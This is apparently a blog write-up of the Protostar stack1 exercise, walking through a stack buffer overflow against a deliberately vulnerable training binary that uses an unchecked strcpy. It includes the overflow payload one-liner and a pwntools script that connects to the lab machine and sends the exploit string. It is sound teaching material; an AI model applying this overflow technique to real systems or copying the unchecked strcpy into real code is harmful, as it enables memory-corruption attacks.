---
title: Protostar - Stack1
description: My writeup on stack1 challenge.
categories:
 - binary exploitation
tags: binary exploitation, protostar
---

You can find the protostar there > [Protostar](https://exploit-exercises.lains.space/protostar/){:target="_blank"}

We have the source code of the binary :

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

We have a variable called `buffer` with 64bytes buffer, then we have `argc` (number of arguments passed) program name is one of them.

Then we have the `modified` variable & the most important the vulnerable `strcpy` function.

`strcpy` -> doesn't do any length checking

Then we have an if statement, if `modified == 0x61626364` we get the flag.

`0x61626364` in Ascii is :

```python
>>> "61626364".decode('hex')
'abcd'
```

Let's run the binary.

```bash
user@protostar:/opt/protostar/bin$ ./stack1
stack1: please specify an argument

user@protostar:/opt/protostar/bin$ ./stack1 1337
Try again, you got 0x00000000
```

Let's enter now 65bytes.

```bash
user@protostar:/opt/protostar/bin$ ./stack1 $(python -c 'print "A" * 65')
Try again, you got 0x00000041
```

We got `0x00000041`, `41 == A`, we simple now add `abcd` in little endian.

```python
>>> from pwn import *
>>> p32(0x61626364)
b'dcba'
```

```bash
user@protostar:/opt/protostar/bin$ ./stack1 $(python -c 'print "A" * 64 + "dcba"')
you have correctly got the variable to the right value
```

Let's write an exploit now with `pwntools`

```python
#!/usr/bin/env python3

from pwn import *
#context.log_level = 'debug'
shell = ssh('user', '$private_ip', password='user', port=22)
sh = shell.run('sh')
sh.sendline('/opt/protostar/bin/stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba')
log.success(sh.recvline())
```

Let's execute it.

```bash
$ ./exp.py 
[+] Connecting to $private_ip on port 22: Done
[*] user@$private_ip:
    Distro    Unknown Unknown
    OS:       Unknown
    Arch:     Unknown
    Version:  0.0.0
    ASLR:     Disabled
    Note:     Susceptible to ASLR ulimit trick (CVE-2016-3672)
[+] Opening new channel: 'sh': Done
[+] b'$ you have correctly got the variable to the right value\n'
```
